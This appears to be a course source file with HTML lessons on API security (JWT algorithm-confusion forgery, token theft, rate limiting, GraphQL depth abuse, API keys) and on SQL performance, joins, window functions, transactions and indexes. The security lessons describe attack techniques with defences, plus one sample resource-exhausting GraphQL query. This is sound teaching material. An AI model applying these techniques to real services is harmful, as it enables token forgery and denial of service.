<p><strong>RS256/HS256 confusion attack</strong>: If the server normally uses RS256 (asymmetric — signs with private key, verifies with public key), but the library also accepts HS256, an attacker can take the server's public key (which is public), sign a forged token with it using HS256, and present it. The library verifies it as valid because it uses the public key as the HMAC secret. Fix: explicitly whitelist only the algorithms your server uses.</p>
<p><strong>Weak secrets</strong>: HS256 is only as secure as the secret key. Secrets like "secret", "password", or any dictionary word are brute-forceable offline once an attacker has captured a token. JWT secrets should be generated as 256+ bit random values: <code>node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"</code>.</p>
<p><strong>No expiry or rotation</strong>: A JWT without an <code>exp</code> claim is valid forever — if leaked (from a log, a URL, a compromised device), it provides permanent access. JWTs should have short expiry times (15-60 minutes for access tokens, 7-30 days for refresh tokens). Implement refresh token rotation: each use of a refresh token issues a new one and invalidates the old — if a leaked token is used after rotation, the server detects reuse and can invalidate all sessions.</p>
<p><strong>Storing JWTs in localStorage</strong>: localStorage is accessible by any JavaScript on the page — including XSS payloads. If your site has any XSS vulnerability, stored JWTs are immediately exfiltrated. Store access tokens in memory (JavaScript variable) and refresh tokens in HttpOnly cookies (JavaScript cannot read these). This is the recommendation from OAuth 2.0 Security Best Current Practice (RFC 9700).</p>

<h5 class="content-heading">Rate Limiting and Abuse Prevention</h5>
<p>Rate limiting is essential for APIs. Without it, attackers can: brute-force passwords (millions of attempts per second), enumerate valid email addresses (check which addresses exist), scrape your entire database, and conduct denial of service attacks. Implement rate limiting at multiple layers:</p>
<ul class="content-list">
<li><strong>IP-based rate limiting:</strong> Limit requests per IP address per time window. Useful but bypassable with distributed botnet IPs.</li>
<li><strong>User-based rate limiting:</strong> Limit authenticated requests per user. Prevents authenticated abuse even from distributed IPs.</li>
<li><strong>Endpoint-specific limits:</strong> Login endpoints: 5 attempts per 15 minutes. Password reset: 3 per hour. General API: 1000 per hour. Set limits based on legitimate use patterns.</li>
<li><strong>Exponential backoff:</strong> After failed auth attempts, increase the wait time exponentially (1s, 2s, 4s, 8s...). Makes brute-force attacks impractical even within IP limits.</li>
</ul>

<h5 class="content-heading">GraphQL-Specific Security</h5>
<p>GraphQL APIs have unique security considerations. Unlike REST, a single GraphQL endpoint accepts queries of arbitrary complexity — an attacker can craft deeply nested queries that join across multiple relationships and require exponential database queries to resolve: <code>{ users { friends { friends { friends { posts { comments { ... } } } } } } }</code>. Fix: implement query depth limiting, query complexity analysis (assign a cost to each field), and request timeout. Disable introspection in production — introspection allows anyone to query your entire schema, making API enumeration trivial.</p>

<h5 class="content-heading">API Key Management</h5>
<p>If your API uses API keys rather than JWTs: generate keys as 256-bit random values. Never log them in full — log only the first 8 characters for reference. Store them hashed (bcrypt or SHA-256) — if your key database is compromised, the actual keys are not revealed. Scope keys to specific operations (read-only keys vs write keys). Provide a key rotation mechanism and document it. Set expiry dates on keys. The 2022 Twilio breach was enabled by an SMS phishing attack that captured employee credentials — API keys in plaintext in a configuration file on the compromised machine allowed the attacker lateral movement to customer data.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>BOLA (Broken Object Level Authorization):</strong> Failing to verify the requester owns the resource they are accessing by ID — the #1 API vulnerability.</li>
<li><strong>Mass assignment:</strong> API endpoint that updates any provided field without an allowlist — allows attackers to set privileged fields like isAdmin.</li>
<li><strong>JWT (JSON Web Token):</strong> Stateless bearer token for API authentication — consists of header, payload, and signature, all base64-encoded.</li>
<li><strong>alg:none attack:</strong> JWT vulnerability where accepting the "none" algorithm allows unsigned tokens — always explicitly whitelist allowed algorithms.</li>
<li><strong>RS256/HS256 confusion:</strong> JWT attack exploiting algorithm flexibility — serve tokens with a consistent single algorithm and reject all others.</li>
<li><strong>Refresh token rotation:</strong> Each use of a refresh token issues a new one and invalidates the old — enables detection of token theft.</li>
<li><strong>Rate limiting:</strong> Restricting request volume per client/endpoint/time window — prevents brute force, enumeration, and resource exhaustion attacks.</li>
<li><strong>GraphQL depth limiting:</strong> Restricting query nesting depth — prevents exponential query complexity attacks unique to GraphQL APIs.</li>
<li><strong>API key scoping:</strong> Restricting API keys to only the operations they need — limits blast radius of compromised keys.</li>
<li><strong>Penetration testing:</strong> Authorised simulated attacks to find vulnerabilities before real attackers do — required before production launch of any security-sensitive API.</li>
<li><strong>Introspection:</strong> GraphQL feature allowing clients to query the full schema — disable in production to prevent API enumeration.</li>
<li><strong>Secure SDLC:</strong> Integrating security at every phase — threat modelling in design, SAST in development, code review pre-merge, pen testing pre-release.</li>
</ul>`,

  // ── Course 3: Advanced SQL & Databases ───────────────────────────────
  13: `<p>Query performance is one of the most impactful skills a backend developer can develop. A poorly written query that runs in 8 seconds on a table of 100,000 rows will run in 80 seconds on a table of 1 million rows — linearly worse as your data grows. The difference between a fast and slow application often comes down to a handful of slow database queries. Understanding how the <strong>query planner</strong> thinks, reading execution plans, and knowing when and how to add indexes separates developers who can build scalable applications from those who cannot.</p>
<p>The query planner is the database's internal optimizer — it receives your SQL, considers dozens of possible execution strategies, estimates the cost of each, and chooses the cheapest. It does not always choose correctly (especially with stale statistics or unusual data distributions), and understanding its decisions lets you guide it to better choices.</p>

<h5 class="content-heading">Reading EXPLAIN ANALYZE — The Developer's Superpower</h5>
<p><code>EXPLAIN</code> shows the execution plan the planner would choose. <code>EXPLAIN ANALYZE</code> actually executes the query and shows both the estimated and actual costs — the discrepancy between the two reveals when the planner's estimates are wrong.</p>
<p>Key things to look for in an EXPLAIN output:</p>
<ul class="content-list">
<li><strong>Seq Scan (Sequential/Full Table Scan):</strong> The database reads every row. On a table with 10 million rows this means reading potentially gigabytes of data. Look for Seq Scans on large tables in the inner loop of a join — that is almost always a missing index.</li>
<li><strong>Index Scan:</strong> The database walks the B-Tree index to find matching rows, then fetches them from the heap (the actual table). Fast for queries returning a small percentage of rows. The index is a sorted list of key → row location pointers.</li>
<li><strong>Index Only Scan:</strong> The database satisfies the entire query from the index without touching the table at all — the fastest possible scan. This only works when the index contains all columns the query needs (a <strong>covering index</strong>).</li>
<li><strong>Bitmap Heap Scan:</strong> Used for queries returning a moderate number of rows. First builds a bitmap of matching row locations from the index, then fetches all matching rows in heap (disk) order — reduces random I/O vs. a plain index scan.</li>
<li><strong>Nested Loop Join:</strong> For each row in the outer table, look up matching rows in the inner table. Efficient when the inner table lookup uses an index and the number of outer rows is small. Catastrophic when the inner table requires a full scan for each outer row.</li>
<li><strong>Hash Join:</strong> Builds a hash table from the smaller table, then probes it with rows from the larger table. Efficient for large joins with no useful index. Memory-intensive — if the hash table spills to disk, performance degrades sharply.</li>
<li><strong>rows= estimate vs. actual:</strong> When the planner's row estimate is wildly off (e.g. estimates 10, actually 100,000), the wrong join algorithm is usually chosen. Run <code>ANALYZE tablename</code> to refresh table statistics and help the planner estimate more accurately.</li>
</ul>

<h5 class="content-heading">The N+1 Query Problem — The Most Common Performance Killer</h5>
<p>N+1 occurs whenever you fetch a list of N items and then execute an additional query for each item to fetch related data. The result is N+1 total queries where one well-written query would suffice. On a list of 1,000 orders, N+1 means 1,001 round-trips to the database — at 1ms per query, that is 1 second just in database latency, not counting network and processing overhead. At 10,000 orders it is 10 seconds.</p>
<p>Classic N+1 in an ORM (using Sequelize/Hibernate style lazy loading): fetching all users, then inside a loop accessing <code>user.posts</code> triggers a new query for each user. The fix is eager loading — tell the ORM to JOIN and fetch related data in the initial query: <code>User.findAll({ include: [{ model: Post }] })</code>. This generates a single SQL query with a JOIN, returning all users and their posts in one database round-trip.</p>
<p>Detecting N+1: enable SQL query logging in development and count queries per page load. Anything above ~10 queries for a single page is a red flag. Tools like Django Debug Toolbar, Bullet (Rails), or Hibernate's statistics logging make N+1 immediately visible.</p>

<h5 class="content-heading">Query Optimisation Techniques</h5>
<p><strong>Select only what you need</strong>: <code>SELECT *</code> fetches every column, including large text fields, JSON blobs, and binary data you do not need. Always specify the columns you actually use: <code>SELECT id, name, email FROM users</code>. This reduces the amount of data transferred from the database to your application and can enable index-only scans.</p>
<p><strong>Filter early, join late</strong>: Apply WHERE conditions before joining where possible. A subquery or CTE (Common Table Expression) that filters down to a small result set before joining a large table is often dramatically faster than joining first and filtering after.</p>
<p><strong>Avoid functions on indexed columns in WHERE clauses</strong>: <code>WHERE LOWER(email) = 'user@example.com'</code> prevents the index on <code>email</code> from being used — the database must apply LOWER() to every row, forcing a full scan. Instead, store emails lowercased or use a functional index: <code>CREATE INDEX ON users (LOWER(email))</code>.</p>
<p><strong>Use LIMIT for pagination</strong>: Keyset pagination (cursor-based) using <code>WHERE id > last_seen_id LIMIT 20</code> is far more efficient than offset pagination (<code>LIMIT 20 OFFSET 10000</code>). With offset pagination, the database must scan and discard the first 10,000 rows on every page load — gets slower with every page.</p>

<h5 class="content-heading">Understanding Query Statistics</h5>
<p>PostgreSQL's <code>pg_stat_statements</code> extension tracks every query executed — total execution time, average execution time, number of calls, and rows returned. This is the fastest way to find the most expensive queries in your application: <code>SELECT query, total_exec_time, calls, mean_exec_time FROM pg_stat_statements ORDER BY total_exec_time DESC LIMIT 20;</code> — the top 20 slowest queries by total time (not just individual call time) are almost always your biggest optimisation opportunities.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Query planner:</strong> The database's internal optimiser that chooses the execution strategy — estimates row counts and costs to select the most efficient plan.</li>
<li><strong>EXPLAIN ANALYZE:</strong> Executes the query and shows both estimated and actual costs — essential for identifying plan estimation errors and slow operations.</li>
<li><strong>Sequential scan:</strong> Reading every row in a table — fast for full-table reads, catastrophic in joins on large tables with no matching index.</li>
<li><strong>Index scan:</strong> B-Tree traversal to find matching rows — fast when returning a small fraction of table rows.</li>
<li><strong>Index only scan:</strong> Query satisfied entirely from the index without touching the table — requires a covering index and is the fastest scan type.</li>
<li><strong>Covering index:</strong> An index that includes all columns needed by the query — enables index-only scans, eliminating table access entirely.</li>
<li><strong>N+1 problem:</strong> Fetching N items then making one additional query per item — results in N+1 round-trips instead of 1. Fix with eager loading or JOINs.</li>
<li><strong>Eager loading:</strong> Fetching related data in the same query (via JOIN) rather than lazily loading it per item in application code.</li>
<li><strong>Hash join:</strong> Join algorithm that builds a hash table of the smaller table and probes with the larger — efficient for large, unindexed joins.</li>
<li><strong>Nested loop join:</strong> For each outer row, look up inner rows — efficient with small outer sets and indexed inner lookups; catastrophic otherwise.</li>
<li><strong>Keyset pagination:</strong> Using <code>WHERE id > cursor LIMIT n</code> for consistent O(log n) performance regardless of page depth — superior to offset pagination.</li>
<li><strong>pg_stat_statements:</strong> PostgreSQL extension tracking query performance statistics — use to identify the most expensive queries in production.</li>
</ul>`,

  14: `<p>SQL joins are the mechanism that makes relational databases powerful — they allow you to combine data from multiple normalised tables into meaningful, complete result sets. Choosing the correct join type is not just a syntactic concern; the wrong join silently returns incorrect data with no error message. A misplaced INNER JOIN instead of a LEFT JOIN drops rows you needed, a missing join condition creates a Cartesian product, and a poorly ordered multi-table join can multiply your query time by orders of magnitude.</p>
<p>Understanding joins at a conceptual level — not just memorising syntax — lets you reason about what rows will appear in the result, what NULLs mean, and how to debug unexpected result counts.</p>

<h5 class="content-heading">The Join Types — Visual and Conceptual</h5>
<p>Think of two tables as overlapping circles in a Venn diagram. The join type defines which part of the diagram appears in the result.</p>
<p><strong>INNER JOIN</strong> — Returns only rows where the join condition matches in <em>both</em> tables. Rows that exist in one table but not the other are completely excluded. Use case: "Get all orders with their corresponding customer names" — you only want orders that have a valid customer. If any order has a NULL customer_id or a customer_id that does not exist in the customers table, it disappears from the result. This is a common source of "missing data" bugs when referential integrity is not enforced.</p>
<p><strong>LEFT JOIN (LEFT OUTER JOIN)</strong> — Returns all rows from the left table regardless of whether a match exists in the right table. Where no match exists, right-table columns are NULL. Use case: "Get all customers and their orders, including customers who have never ordered" — a LEFT JOIN from customers to orders. Customers with no orders appear with NULLs in all order columns. This is the most commonly needed join type in application development.</p>
<p><strong>RIGHT JOIN</strong> — The mirror of LEFT JOIN: all rows from the right table are preserved. In practice, RIGHT JOIN is rare — any RIGHT JOIN can be rewritten as a LEFT JOIN by swapping the table order, which is usually clearer. Most style guides recommend always using LEFT JOIN and reordering tables instead.</p>
<p><strong>FULL OUTER JOIN</strong> — All rows from both tables are returned. Where no match exists on either side, NULLs fill in. Use case: "Compare two datasets and find records that exist in one but not the other" — e.g. finding discrepancies between an expected list and an actual list. Less common in application development, very useful in data reconciliation.</p>
<p><strong>CROSS JOIN</strong> — The Cartesian product: every row in the left table paired with every row in the right table. If left has 1,000 rows and right has 1,000 rows, the result has 1,000,000 rows. Almost never intentional in an application — an accidental CROSS JOIN (joining two tables with no ON condition) is a catastrophic bug that can crash a database server.</p>

<h5 class="content-heading">Self-Joins — Querying Hierarchies</h5>
<p>A self-join is a table joined to itself using aliases. The canonical use case is a hierarchical table: an <code>employees</code> table where each row has a <code>manager_id</code> column referencing another row in the same table. To list each employee alongside their manager's name:</p>
<p><code>SELECT e.name AS employee, m.name AS manager FROM employees e LEFT JOIN employees m ON e.manager_id = m.id</code></p>
<p>The LEFT JOIN ensures top-level employees (CEO with no manager, manager_id IS NULL) still appear in the result. An INNER JOIN would exclude them. Self-joins are also used for finding all pairs within a table: <code>SELECT a.name, b.name FROM users a JOIN users b ON a.id &lt; b.id</code> — the <code>a.id &lt; b.id</code> prevents duplicate pairs and self-pairing.</p>

<h5 class="content-heading">CTEs — Common Table Expressions for Readable Complex Queries</h5>
<p>A <strong>CTE</strong> (Common Table Expression) defined with the <code>WITH</code> keyword creates a named temporary result set that can be referenced multiple times in the main query. CTEs dramatically improve readability for complex multi-step queries:</p>
<p><code>WITH monthly_revenue AS (SELECT DATE_TRUNC('month', created_at) AS month, SUM(amount) AS revenue FROM orders GROUP BY 1), ranked AS (SELECT *, RANK() OVER (ORDER BY revenue DESC) AS rank FROM monthly_revenue) SELECT * FROM ranked WHERE rank &lt;= 3;</code></p>
<p>This finds the top 3 revenue months. Without a CTE, this would require nested subqueries that are much harder to read and debug. In PostgreSQL, CTEs are materialised by default (computed once, stored as a temp table), which can be faster or slower than inlining depending on the query — use <code>WITH ... AS MATERIALIZED</code> or <code>NOT MATERIALIZED</code> to override.</p>
<p><strong>Recursive CTEs</strong> enable walking hierarchical data (like org charts or category trees) to arbitrary depth:</p>
<p><code>WITH RECURSIVE subordinates AS (SELECT id, name, manager_id FROM employees WHERE id = 1 UNION ALL SELECT e.id, e.name, e.manager_id FROM employees e JOIN subordinates s ON e.manager_id = s.id) SELECT * FROM subordinates;</code></p>
<p>This retrieves an employee and all direct and indirect reports, no matter how deep the hierarchy. Without recursive CTEs, this would require multiple queries or application-level tree traversal.</p>

<h5 class="content-heading">Subqueries vs Joins — When to Use Each</h5>
<p>A subquery in a WHERE clause (<code>WHERE id IN (SELECT ...)</code>) is often less efficient than a JOIN because the optimizer has less flexibility to choose the best execution strategy. In PostgreSQL and MySQL modern versions, the optimizer usually rewrites IN subqueries as joins automatically, but explicit JOINs give you more control and transparency. Use subqueries when the logic is clearer expressed that way (e.g. EXISTS checks), and JOINs when you need columns from both tables or need to control the join order.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>INNER JOIN:</strong> Returns only matched rows from both tables — unmatched rows are excluded. Most restrictive join type.</li>
<li><strong>LEFT JOIN:</strong> All rows from the left table; NULLs for unmatched right-table columns. Use when you need to preserve all left-table rows regardless of match.</li>
<li><strong>FULL OUTER JOIN:</strong> All rows from both tables with NULLs where unmatched — useful for data reconciliation and finding discrepancies between datasets.</li>
<li><strong>CROSS JOIN:</strong> Cartesian product of both tables — almost always accidental; an unguarded cross join on large tables can crash a database.</li>
<li><strong>Self-join:</strong> A table joined to an alias of itself — essential for hierarchical data (employee/manager, category/parent) and pair-finding queries.</li>
<li><strong>CTE (Common Table Expression):</strong> Named temporary result set defined with WITH — improves readability of complex multi-step queries; can be referenced multiple times.</li>
<li><strong>Recursive CTE:</strong> CTE that references itself to traverse hierarchical data to arbitrary depth — eliminates the need for multiple queries or application-level tree walking.</li>
<li><strong>JOIN condition:</strong> The ON clause defining how rows match — a missing or wrong condition produces incorrect results with no error message.</li>
<li><strong>Cartesian product:</strong> The result of joining without a condition — N × M rows, almost always unintentional and catastrophic on large tables.</li>
<li><strong>NULL in joins:</strong> Unmatched rows in outer joins appear with NULLs — important to handle in WHERE clauses (use IS NULL / IS NOT NULL, not = NULL).</li>
<li><strong>EXISTS subquery:</strong> More efficient than IN for checking existence of related rows — stops scanning as soon as the first match is found.</li>
</ul>`,

  15: `<p><strong>Window functions</strong> are one of the most powerful features in SQL — and one of the most under-used by developers who learned SQL from tutorials. They allow you to compute values across a set of rows related to the current row, without collapsing those rows into a single aggregate output. The transformation that would require a self-join and a subquery without window functions can often be expressed as a single, readable SELECT statement with window functions.</p>
<p>Once you understand window functions, you will reach for them constantly: ranking records within groups, calculating running totals, finding previous/next values, computing moving averages, detecting gaps in sequences, and numbering rows within partitions. Every senior SQL developer uses them fluently.</p>

<h5 class="content-heading">The Anatomy of a Window Function</h5>
<p>All window functions share the same structure: <code>FUNCTION_NAME(expression) OVER (PARTITION BY ... ORDER BY ... ROWS/RANGE ...)</code></p>
<p><strong>OVER()</strong> is what makes it a window function. Without OVER, the function would be a regular aggregate. OVER() with no arguments applies the function across all rows in the result set.</p>
<p><strong>PARTITION BY</strong> divides rows into groups — the function is computed independently within each partition. Like GROUP BY but without collapsing rows. Example: <code>RANK() OVER (PARTITION BY department ORDER BY salary DESC)</code> ranks employees within their own department rather than globally.</p>
<p><strong>ORDER BY within OVER</strong> defines the ordering for functions that care about sequence — running totals, rankings, LAG/LEAD. Note: ORDER BY inside OVER is completely separate from the ORDER BY at the end of your query that sorts the final output.</p>
<p><strong>ROWS / RANGE frame clause</strong>: For aggregate window functions like SUM and AVG, you can define exactly which rows around the current row to include in the calculation. <code>ROWS BETWEEN 6 PRECEDING AND CURRENT ROW</code> creates a 7-day rolling window. <code>ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW</code> creates a cumulative sum.</p>

<h5 class="content-heading">Ranking Functions</h5>
<p><strong>ROW_NUMBER()</strong> assigns a unique sequential integer starting from 1 within each partition. Every row gets a distinct number — no ties. Use case: pagination with window functions, deduplication (keep only the first row per group using a CTE + WHERE row_num = 1).</p>
<p><strong>RANK()</strong> assigns the same rank to tied rows, then skips ranks. If two rows tie for rank 2, the next rank is 4 (not 3). Mirrors how sports rankings work — "joint second place, then fourth".</p>
<p><strong>DENSE_RANK()</strong> also ties but does not skip — two rows at rank 2 are followed by rank 3. Use case: "Top N results" where you want a consistent number of distinct rank levels regardless of ties.</p>
<p><strong>NTILE(n)</strong> divides rows into n roughly equal buckets. <code>NTILE(4) OVER (ORDER BY score DESC)</code> assigns rows to quartiles 1-4. Useful for percentile-based analysis.</p>
<p><strong>PERCENT_RANK()</strong> and <strong>CUME_DIST()</strong> calculate relative rank as a fraction between 0 and 1 — useful for finding what percentage of rows a given row beats.</p>

<h5 class="content-heading">LAG and LEAD — Accessing Adjacent Rows</h5>
<p><strong>LAG(column, offset, default)</strong> returns the value from a row <em>before</em> the current row within the partition. <strong>LEAD(column, offset, default)</strong> returns the value from a row <em>after</em>. Both eliminate the need for self-joins to compare a row to its predecessor or successor.</p>
<p>Classic use case: calculating day-over-day revenue change: <code>SELECT date, revenue, revenue - LAG(revenue) OVER (ORDER BY date) AS daily_change FROM daily_revenue;</code> — for every day, you instantly see how revenue changed from the previous day. Without LAG, this requires a self-join on dates.</p>
<p>Finding gaps in a sequence: <code>SELECT id, id - LAG(id) OVER (ORDER BY id) AS gap FROM events WHERE id - LAG(id) OVER (ORDER BY id) > 1</code> — returns all rows where there is a gap in the id sequence. Essential for audit trail verification.</p>

<h5 class="content-heading">Aggregate Window Functions</h5>
<p>Standard aggregates (SUM, COUNT, AVG, MIN, MAX) can be used as window functions with OVER(). This is how you compute running totals and moving averages without self-joins:</p>
<p><strong>Running total</strong>: <code>SELECT date, amount, SUM(amount) OVER (ORDER BY date ROWS UNBOUNDED PRECEDING) AS running_total FROM payments;</code></p>
<p><strong>7-day moving average</strong>: <code>SELECT date, revenue, AVG(revenue) OVER (ORDER BY date ROWS 6 PRECEDING) AS moving_avg_7d FROM daily_revenue;</code></p>
<p><strong>Percentage of total within group</strong>: <code>SELECT dept, name, salary, salary / SUM(salary) OVER (PARTITION BY dept) * 100 AS pct_of_dept FROM employees;</code> — shows each employee's salary as a percentage of their department's total, in one query.</p>

<h5 class="content-heading">FIRST_VALUE, LAST_VALUE, NTH_VALUE</h5>
<p><strong>FIRST_VALUE(column)</strong> returns the first value in the window frame. Useful for "how does this row compare to the best in its group?": <code>salary - FIRST_VALUE(salary) OVER (PARTITION BY dept ORDER BY salary DESC)</code> shows how far each employee's salary is below the top earner in their department.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Window function:</strong> Computes a value across related rows without collapsing them — the OVER() clause is what makes it a window function.</li>
<li><strong>OVER():</strong> Defines the window — optional PARTITION BY, ORDER BY, and frame clause (ROWS/RANGE) control exactly which rows are included.</li>
<li><strong>PARTITION BY:</strong> Divides rows into independent groups for the function — like GROUP BY but keeps all rows visible.</li>
<li><strong>ROW_NUMBER():</strong> Unique sequential integer per row within partition — no ties. Use for deduplication and pagination.</li>
<li><strong>RANK():</strong> Ties get the same rank, then the next rank is skipped. DENSE_RANK() ties but never skips ranks.</li>
<li><strong>LAG(col, n):</strong> Returns the value from n rows before the current row in the window — eliminates self-joins for sequential comparisons.</li>
<li><strong>LEAD(col, n):</strong> Returns the value from n rows after the current row — useful for comparing a row to its future successor.</li>
<li><strong>ROWS UNBOUNDED PRECEDING:</strong> Frame clause for cumulative aggregation — includes all rows from the start of the partition to the current row.</li>
<li><strong>ROWS n PRECEDING:</strong> Rolling window frame — includes only the last n rows, enabling moving averages.</li>
<li><strong>NTILE(n):</strong> Distributes rows into n equal buckets — use for quartile, decile, or percentile analysis.</li>
<li><strong>FIRST_VALUE / LAST_VALUE:</strong> Return the first or last value in the window frame — useful for within-group comparisons against the best or worst value.</li>
</ul>`,

  16: `<p><strong>Transactions</strong> are the mechanism that ensures your database remains in a consistent, correct state even when multiple things can go wrong simultaneously — your application crashes mid-operation, two users modify the same data at the same time, a network error interrupts a multi-step update. Without transactions, any failure leaves your data in a partial, corrupted state. With transactions, either all changes succeed and are committed, or none of them are applied — the database reverts cleanly to the state before the transaction began.</p>
<p>This guarantee is not just for financial applications. Any operation that modifies more than one row or more than one table needs to be wrapped in a transaction to be correct. A blog post creation that inserts the post AND updates a counter is a transaction. An order fulfilment that decrements inventory AND creates an order record is a transaction.</p>

<h5 class="content-heading">ACID — The Four Guarantees</h5>
<p><strong>Atomicity</strong> — "All or nothing." The entire transaction is treated as a single atomic unit. If the transaction contains 10 SQL statements and the 8th fails, the database rolls back all 7 previous changes automatically. There is no such thing as a "partial" committed transaction. In PostgreSQL: <code>BEGIN; UPDATE accounts SET balance = balance - 100 WHERE id = 1; UPDATE accounts SET balance = balance + 100 WHERE id = 2; COMMIT;</code> — if either UPDATE fails, a ROLLBACK occurs automatically and both accounts retain their original balances.</p>
<p><strong>Consistency</strong> — The transaction brings the database from one valid state to another valid state. Database constraints (NOT NULL, UNIQUE, CHECK, FOREIGN KEY) are enforced at transaction commit time. If the transaction violates any constraint, it is rolled back and the database remains consistent. The application developer's job is to ensure that each transaction, if it completes, leaves business logic invariants intact (e.g. total money in the system stays constant after a transfer).</p>
<p><strong>Isolation</strong> — Concurrent transactions should not interfere with each other. Without isolation, Transaction A could read data that Transaction B has modified but not yet committed (a "dirty read") — and if B then rolls back, A has operated on data that never actually existed. Isolation levels define the exact guarantees provided; stronger isolation means fewer anomalies but more contention and lower throughput.</p>
<p><strong>Durability</strong> — Once a transaction is committed, its changes are permanent even if the server crashes immediately after. Modern databases achieve this via a Write-Ahead Log (WAL) — changes are written to a sequential log file before being applied to data files. On recovery, the database replays the WAL to restore all committed transactions. This is why <code>fsync</code> must be enabled in production (though it has a performance cost).</p>

<h5 class="content-heading">Isolation Levels — Trading Safety for Performance</h5>
<p>SQL defines four isolation levels, each preventing a different class of anomaly. From weakest to strongest:</p>
<ul class="content-list">
<li><strong>READ UNCOMMITTED:</strong> The weakest level. A transaction can read changes made by other transactions that have not yet been committed — "dirty reads." If the other transaction rolls back, you have read data that never existed. Almost never used in practice; no major database recommends it.</li>
<li><strong>READ COMMITTED:</strong> The default in PostgreSQL and Oracle. A transaction only sees data committed before each of its individual statements. No dirty reads, but <strong>non-repeatable reads</strong> are possible: if you SELECT the same row twice in the same transaction, another transaction might have modified and committed it between your two reads — you get different values.</li>
<li><strong>REPEATABLE READ:</strong> The default in MySQL/InnoDB. A transaction sees a consistent snapshot of the database as of its first read. The same SELECT returns the same rows throughout the transaction. Prevents dirty reads and non-repeatable reads. However, <strong>phantom reads</strong> are possible: a query that counts rows might return different counts if another transaction inserts rows matching your WHERE clause between your two counts (though InnoDB prevents phantoms even at this level via gap locking).</li>
<li><strong>SERIALIZABLE:</strong> The strongest level. Transactions execute as if they were completely sequential — as if no other transaction ran at the same time. All anomalies (dirty reads, non-repeatable reads, phantoms) are prevented. Achieved via predicate locking or optimistic concurrency control with conflict detection. Significant performance overhead — only use when correctness is absolutely critical (e.g. financial ledgers, inventory management).</li>
</ul>

<h5 class="content-heading">Locking, Deadlocks, and How to Avoid Them</h5>
<p>Databases use locks to enforce isolation. <strong>Row-level locks</strong> protect individual rows during modification. <strong>Table-level locks</strong> protect entire tables (used during DDL operations like ALTER TABLE — be careful about running these on live production tables with active traffic).</p>
<p>A <strong>deadlock</strong> occurs when two transactions each hold a lock and are waiting for the other's lock: Transaction A locks row 1, then tries to lock row 2; Transaction B locks row 2, then tries to lock row 1. Neither can proceed. The database detects the cycle (usually within a second) and kills one transaction with a deadlock error — the application must catch this and retry.</p>
<p>Preventing deadlocks: always acquire locks in the same order across transactions. If your application always locks resources in ascending ID order, deadlocks become impossible. Use <code>SELECT ... FOR UPDATE</code> to explicitly lock rows you intend to modify, acquiring all needed locks upfront rather than incrementally.</p>
<p><strong>Optimistic locking</strong> (no database locks): add a <code>version</code> column to your table. When updating a row, include the version in the WHERE clause and increment it: <code>UPDATE orders SET status='shipped', version=version+1 WHERE id=123 AND version=5</code>. If another transaction modified the row first, the version will have changed and your update affects 0 rows — the application detects this and retries. Excellent for low-contention scenarios; avoids lock overhead entirely.</p>
<p><strong>SELECT ... FOR UPDATE</strong>: Locks selected rows for the duration of the transaction. Use when you need to read-then-update and cannot tolerate concurrent modification between the read and update (the "check-then-act" pattern in concurrent systems).</p>

<h5 class="content-heading">Savepoints</h5>
<p>Savepoints allow partial rollbacks within a transaction. <code>SAVEPOINT my_point;</code> marks a point; <code>ROLLBACK TO my_point;</code> undoes everything since the savepoint without aborting the whole transaction. Useful for complex multi-step transactions where you want to retry a sub-operation without discarding all prior work.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Transaction:</strong> A group of SQL statements that succeed or fail atomically — the foundation of data integrity in relational databases.</li>
<li><strong>ACID:</strong> Atomicity, Consistency, Isolation, Durability — the four guarantees that define a reliable transaction.</li>
<li><strong>Atomicity:</strong> All-or-nothing — partial transactions do not exist. Failure rolls back all changes automatically.</li>
<li><strong>Isolation:</strong> Concurrent transactions do not see each other's partial work — the degree of protection is controlled by the isolation level.</li>
<li><strong>Durability:</strong> Committed data survives crashes — achieved via Write-Ahead Logging (WAL).</li>
<li><strong>READ COMMITTED:</strong> Default in PostgreSQL — transactions only see committed data, but repeated reads of the same row may return different values.</li>
<li><strong>SERIALIZABLE:</strong> Strongest isolation — transactions appear to execute sequentially. Required for financial accuracy; high overhead.</li>
<li><strong>Deadlock:</strong> Two transactions each waiting for the other's lock — the database kills one; the application must catch and retry. Prevent by acquiring locks in consistent order.</li>
<li><strong>SELECT FOR UPDATE:</strong> Explicitly locks rows within a transaction — use for read-modify-write patterns that must not be interrupted by concurrent updates.</li>
<li><strong>Optimistic locking:</strong> Version-column approach to concurrency — no database locks; detects conflicts at write time via version mismatch.</li>
<li><strong>Dirty read:</strong> Reading uncommitted data from another transaction — prevented by all levels except READ UNCOMMITTED.</li>
<li><strong>Write-Ahead Log (WAL):</strong> Sequential log written before data files — enables crash recovery and replication.</li>
</ul>`,

  17: `<p>Indexes are the single most impactful performance optimisation available in SQL databases. A well-placed index can turn a query that takes 30 seconds into one that completes in 2 milliseconds — a 15,000× improvement. No amount of application-level caching compensates for a missing index that causes the database to scan millions of rows for every request. Yet indexes are also frequently misunderstood, misused, and over-applied — leading to write performance degradation and wasted storage without any read benefit.</p>
<p>Understanding how indexes work internally — not just how to create them — is what allows you to reason about <em>which</em> queries they will speed up, <em>when</em> the query planner will use them, and <em>what</em> trade-offs you are making for every index you add.</p>

<h5 class="content-heading">How B-Tree Indexes Work Internally</h5>
<p>The default index type in all major databases (PostgreSQL, MySQL, SQL Server, Oracle) is the <strong>B-Tree</strong> (Balanced Tree). A B-Tree index is a sorted tree structure where each node contains key values and pointers to child nodes. To find a row with <code>email = 'alice@example.com'</code>, the database traverses the tree from root to a leaf node in O(log n) time — for a table of 100 million rows, this is about 27 comparisons instead of 100 million. The leaf nodes contain the key values and pointers (page + offset) to the actual row locations in the heap (the physical table storage).</p>
<p>B-Tree indexes support: equality lookups (<code>WHERE id = 5</code>), range queries (<code>WHERE created_at BETWEEN ... AND ...</code>), prefix matching (<code>WHERE name LIKE 'Al%'</code>), and ORDER BY on indexed columns (the index is already sorted). They do NOT support: suffix/middle matching (<code>WHERE name LIKE '%Smith'</code> — requires a full index scan), or most function applications on the column (<code>WHERE LOWER(name) = 'alice'</code> — unless you create a functional index).</p>

<h5 class="content-heading">Other Index Types</h5>
